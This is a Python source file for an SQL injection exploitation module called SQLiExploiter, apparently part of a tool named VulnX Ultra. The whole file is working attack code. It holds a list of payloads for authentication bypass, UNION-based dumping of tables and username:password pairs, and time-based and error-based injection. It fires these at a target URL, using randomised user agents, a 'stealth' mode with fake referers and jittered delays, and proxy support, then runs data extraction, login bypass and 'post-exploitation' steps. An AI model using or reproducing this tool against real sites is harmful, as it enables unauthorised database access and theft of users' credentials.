#!/usr/bin/env python3
"""
SQLiExploiter - SQL Injection Exploitation Module for VulnX Ultra
"""

import requests
import urllib.parse
import time
import random
import logging
from rich.console import Console
from rich.panel import Panel
from datetime import datetime
import json
import csv
from fake_useragent import UserAgent

class SQLiExploiter:
    def __init__(self, url, param, method="GET", proxies=None, stealth=False, delay=0, output="sqli_exploit"):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.proxies = proxies
        self.stealth = stealth
        self.delay = delay
        self.output = output
        self.vulnerable = False
        self.console = Console()
        self.results = []
        self.ua = UserAgent()

        # Setup logging
        logging.basicConfig(
            filename=f"sqli_exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s"
        )

        # SQLi Payloads
        self.payloads = [
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "admin'--",
            "admin'#",
            "admin'/*",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT null,table_name,null FROM information_schema.tables--",
            "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT null,concat(username,':',password),null FROM users--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1\" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1 AND EXTRACTVALUE(1,CONCAT(0x5C,(SELECT @@version)))",
            "1' AND EXTRACTVALUE(1,CONCAT(0x5C,(SELECT @@version)))--",
            "1\" AND EXTRACTVALUE(1,CONCAT(0x5C,(SELECT @@version)))--"
        ]

    def detect_database(self, response):
        """Detect the type of database based on response content."""
        content = response.text.lower()
        if "mysql" in content:
            return "MySQL"
        elif "postgres" in content or "postgresql" in content:
            return "PostgreSQL"
        elif "sqlite" in content:
            return "SQLite"
        elif "oracle" in content:
            return "Oracle"
        elif "sql server" in content or "mssql" in content:
            return "Microsoft SQL Server"
        return "Unknown"

    def test_payload(self, payload):
        """Test a single SQLi payload."""
        headers = {
            "User-Agent": self.ua.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }

        if self.stealth:
            headers.update({
                "Referer": "https://www.google.com/",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"
            })

        try:
            # Build URL or data based on method
            if self.method == "GET":
                test_url = f"{self.url}?{self.param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, headers=headers, proxies=self.proxies, timeout=10)
            elif self.method == "POST":
                data = {self.param: payload}
                response = requests.post(self.url, json=data, headers=headers, proxies=self.proxies, timeout=10)
            else:
                self.console.print(f"[red]✗ Unsupported method: {self.method}[/red]")
                logging.error(f"Unsupported method: {self.method}")
                return None

            # Detect database type
            db_type = self.detect_database(response)
            if db_type != "Unknown":
                self.console.print(f"[cyan]Detected database: {db_type}[/cyan]")
                logging.info(f"Detected database: {db_type}")

            # Analyze response for SQLi indicators
            content = response.text.lower()
            if any(keyword in content for keyword in ["sql syntax", "mysql", "error", "warning"]):
                self.vulnerable = True
                self.results.append({
                    "payload": payload,
                    "url": self.url,
                    "type": "SQLi",
                    "message": f"Possible SQL Injection vulnerability detected! (Database: {db_type})",
                    "status": response.status_code,
                    "response_time": response.elapsed.total_seconds(),
                    "database": db_type
                })
                return True
            elif "SLEEP" in payload and response.elapsed.total_seconds() > 4:
                self.vulnerable = True
                self.results.append({
                    "payload": payload,
                    "url": self.url,
                    "type": "SQLi",
                    "message": f"Time-based Blind SQL Injection detected! (Database: {db_type})",
                    "status": response.status_code,
                    "response_time": response.elapsed.total_seconds(),
                    "database": db_type
                })
                return True
            return False

        except Exception as e:
            self.console.print(f"[red]✗ Error testing SQLi payload {payload}: {str(e)}[/red]")
            logging.error(f"Error testing SQLi payload {payload}: {str(e)}")
            return None

    def extract_data(self):
        """Attempt to extract database information using Union-based SQLi."""
        payloads = [
            "' UNION SELECT null,table_name,null FROM information_schema.tables--",
            "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT null,concat(username,':',password),null FROM users--"
        ]
        extracted_data = []

        for payload in payloads:
            time.sleep(self.delay + (random.uniform(0, 1) if self.stealth else 0))
            headers = {"User-Agent": self.ua.random}
            try:
                test_url = f"{self.url}?{self.param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, headers=headers, proxies=self.proxies, timeout=10)
                db_type = self.detect_database(response)
                if response.status_code == 200:
                    extracted_data.append({
                        "payload": payload,
                        "data": response.text[:500],  # Limit output to avoid large logs
                        "status": response.status_code,
                        "database": db_type
                    })
                    self.console.print(f"[green]✓ Extracted data with payload: {payload} (Database: {db_type})[/green]")
                    logging.info(f"Extracted data with payload: {payload} (Database: {db_type})")
            except Exception as e:
                self.console.print(f"[red]✗ Error extracting data with payload {payload}: {str(e)}[/red]")
                logging.error(f"Error extracting data with payload {payload}: {str(e)}")

        return extracted_data

    def attempt_auth_bypass(self):
        """Attempt authentication bypass using SQLi payloads."""
        auth_payloads = [
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR '1'='1",
            "admin'--",
            "admin'#"
        ]
        for payload in auth_payloads:
            time.sleep(self.delay + (random.uniform(0, 1) if self.stealth else 0))
            headers = {"User-Agent": self.ua.random}
            try:
                test_url = f"{self.url}?{self.param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, headers=headers, proxies=self.proxies, timeout=10)
                db_type = self.detect_database(response)
                if response.status_code == 200 and ("dashboard" in response.text.lower() or "welcome" in response.text.lower()):
                    self.vulnerable = True
                    self.results.append({
                        "payload": payload,
                        "url": self.url,
                        "type": "SQLi",
                        "message": f"Authentication bypass successful! (Database: {db_type})",
                        "status": response.status_code,
                        "response_time": response.elapsed.total_seconds(),
                        "database": db_type
                    })
                    self.console.print(f"[green]✓ Authentication bypass successful with payload: {payload} (Database: {db_type})[/green]")
                    logging.info(f"Authentication bypass successful with payload: {payload} (Database: {db_type})")
                    return True
            except Exception as e:
                self.console.print(f"[red]✗ Error attempting auth bypass with payload {payload}: {str(e)}[/red]")
                logging.error(f"Error attempting auth bypass with payload {payload}: {str(e)}")
        return False

    def post_exploitation(self):
        """Perform post-exploitation tasks such as extracting additional database info."""
        if not self.vulnerable:
            self.console.print("[yellow]⚠ No SQLi vulnerabilities detected for post-exploitation[/yellow]")
            logging.info("No SQLi vulnerabilities detected for post-exploitation")
            return

        self.console.print("[yellow]Starting SQLi post-exploitation...[/yellow]")
        logging.info("Starting SQLi post-exploitation")

        # Attempt to extract database version
        version_payload = "' UNION SELECT null,@@version,null--"
        headers = {"User-Agent": self.ua.random}
        try:
            test_url = f"{self.url}?{self.param}={urllib.parse.quote(version_payload)}"
            response = requests.get(test_url, headers=headers, proxies=self.proxies, timeout=10)
            db_type = self.detect_database(response)
            if response.status_code == 200:
                self.results.append({
                    "payload": version_payload,
                    "url": self.url,
                    "type": "SQLi",
                    "message": f"Database version extracted: {response.text[:100]} (Database: {db_type})",
                    "status": response.status_code,
                    "response_time": response.elapsed.total_seconds(),
                    "database": db_type
                })
                self.console.print(f"[green]✓ Database version extracted: {response.text[:100]} (Database: {db_type})[/green]")
                logging.info(f"Database version extracted: {response.text[:100]} (Database: {db_type})")
        except Exception as e:
            self.console.print(f"[red]✗ Error during post-exploitation: {str(e)}[/red]")
            logging.error(f"Error during post-exploitation: {str(e)}")

    def exploit(self):
        """Main exploitation function."""
        self.console.print(Panel.fit("[bold red]Starting SQLi Exploitation[/bold red]"))
        logging.info("Starting SQLi exploitation")

        # Test all payloads
        for payload in self.payloads:
            if self.test_payload(payload):
                self.console.print(f"[green]✓ Vulnerable to SQLi with payload: {payload}[/green]")
                logging.info(f"Vulnerable to SQLi with payload: {payload}")

        # If vulnerable, attempt data extraction, auth bypass, and post-exploitation
        if self.vulnerable:
            self.console.print("[yellow]Attempting data extraction...[/yellow]")
            extracted_data = self.extract_data()
            if extracted_data:
                self.results.extend(extracted_data)

            self.console.print("[yellow]Attempting authentication bypass...[/yellow]")
            if self.attempt_auth_bypass():
                self.console.print("[green]✓ Authentication bypass completed[/green]")

            self.console.print("[yellow]Performing post-exploitation...[/yellow]")
            self.post_exploitation()

        # Save results
        if self.results:
            self.save_results()
        else:
            self.console.print("[yellow]⚠ No SQLi vulnerabilities exploited.[/yellow]")
            logging.info("No SQLi vulnerabilities exploited")

    def save_results(self):
        """Save exploitation results to file."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        try:
            if self.output.endswith(".json"):
                with open(f"{self.output}_{timestamp}.json", "w") as f:
                    json.dump(self.results, f, indent=4, ensure_ascii=False)
                self.console.print(f"[green]✓ Results saved to {self.output}_{timestamp}.json[/green]")
                logging.info(f"Results saved to {self.output}_{timestamp}.json")
            elif self.output.endswith(".csv"):
                with open(f"{self.output}_{timestamp}.csv", "w", newline="", encoding="utf-8") as f:
                    fieldnames = ["payload", "url", "type", "message", "status", "response_time", "database"]
                    writer = csv.DictWriter(f, fieldnames=fieldnames)
                    writer.writeheader()
                    for result in self.results:
                        # Ensure all required fields are present
                        row = {key: result.get(key, "N/A") for key in fieldnames}
                        writer.writerow(row)
                self.console.print(f"[green]✓ Results saved to {self.output}_{timestamp}.csv[/green]")
                logging.info(f"Results saved to {self.output}_{timestamp}.csv")
            else:
                with open(f"{self.output}_{timestamp}.txt", "w", encoding="utf-8") as f:
                    for result in self.results:
                        f.write(f"Payload: {result.get('payload', 'N/A')}\n")
                        f.write(f"URL: {result.get('url', 'N/A')}\n")
                        f.write(f"Type: {result.get('type', 'N/A')}\n")
                        f.write(f"Message: {result.get('message', 'N/A')}\n")
                        f.write(f"Status: {result.get('status', 'N/A')}\n")
                        f.write(f"Response Time: {result.get('response_time', 'N/A')}s\n")
                        f.write(f"Database: {result.get('database', 'N/A')}\n")
                        f.write("\n" + "="*50 + "\n\n")
                self.console.print(f"[green]✓ Results saved to {self.output}_{timestamp}.txt[/green]")
                logging.info(f"Results saved to {self.output}_{timestamp}.txt")
        except Exception as e:
            self.console.print(f"[red]✗ Error saving results: {str(e)}[/red]")
            logging.error(f"Error saving results: {str(e)}")
            